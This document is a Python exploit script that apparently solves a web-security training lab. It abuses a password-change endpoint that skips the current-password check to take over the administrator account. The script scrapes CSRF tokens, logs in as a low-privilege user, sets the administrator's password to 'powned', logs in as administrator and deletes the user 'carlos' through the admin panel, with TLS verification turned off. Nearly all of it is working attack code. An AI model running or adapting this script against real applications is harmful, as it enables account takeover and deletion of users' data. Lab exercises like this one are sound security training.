"""
    Lab: Weak isolation on dual-use endpoint

    Exploitation Steps:
    1. Catch the CSRF-Token from login page
    2. Login as wiener:peter
    3. Catch the CSRF-Token from /my-account page
    4. Change the administrator password without use the 'current-password' parameter
    5. Log out
    6. Login as administrator with the new password
    7. Delete 'carlos' user from admin panel

    Author: N00BCYB0T (adapted)
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}Logging as 'wiener:peter'...{Fore.RESET}")
    data = {
        "username": "wiener",
        "password": "peter"
    }
    login(session, data)

    print(f"{Fore.YELLOW}Changing the 'administrator' password...{Fore.RESET}")
    change_password(session)

    print(f"{Fore.YELLOW}Logging out...{Fore.RESET}")
    fetch(session, "/logout")

    print(f"{Fore.YELLOW}Logging as 'administrator'...{Fore.RESET}")
    data = {
        "username": "administrator",
        "password": "powned"
    }
    login(session, data)

    print(f"{Fore.YELLOW}Deleting user 'carlos' from admin panel...{Fore.RESET}")
    fetch(session, "/admin/delete?username=carlos")

    response = fetch(session, "/")
    if "Congratulations, you solved the lab!" in response.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Lab not solved!{Fore.RESET}")

def fetch(session, path):
    try:
        url = path if path.startswith("http") else f"{URL}{path}"
        return session.get(url, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch {path}: {e}{Fore.RESET}")
        exit(1)

def get_csrf(text):
    match = re.search(r'csrf\" value=\"(.+?)\"', text)
    if not match:
        print(f"{Fore.RED}[-] CSRF token not found!{Fore.RESET}")
        exit(1)
    print(f"{Fore.GREEN}[+] Found CSRF Token: {match.group(1)}{Fore.RESET}")
    return match.group(1)

def login(session, data):
    response = fetch(session, "/login")
    csrf_token = get_csrf(response.text)
    data['csrf'] = csrf_token
    try:
        session.post(f"{URL}/login", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to login: {e}{Fore.RESET}")
        exit(1)

def change_password(session):
    response = fetch(session, "/my-account")
    csrf_token = get_csrf(response.text)
    data = {
        "csrf": csrf_token,
        "username": "administrator",
        "new-password-1": "powned",
        "new-password-2": "powned"
    }
    try:
        session.post(f"{URL}/my-account/change-password", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to change password: {e}{Fore.RESET}")

if __name__ == "__main__":
    main()
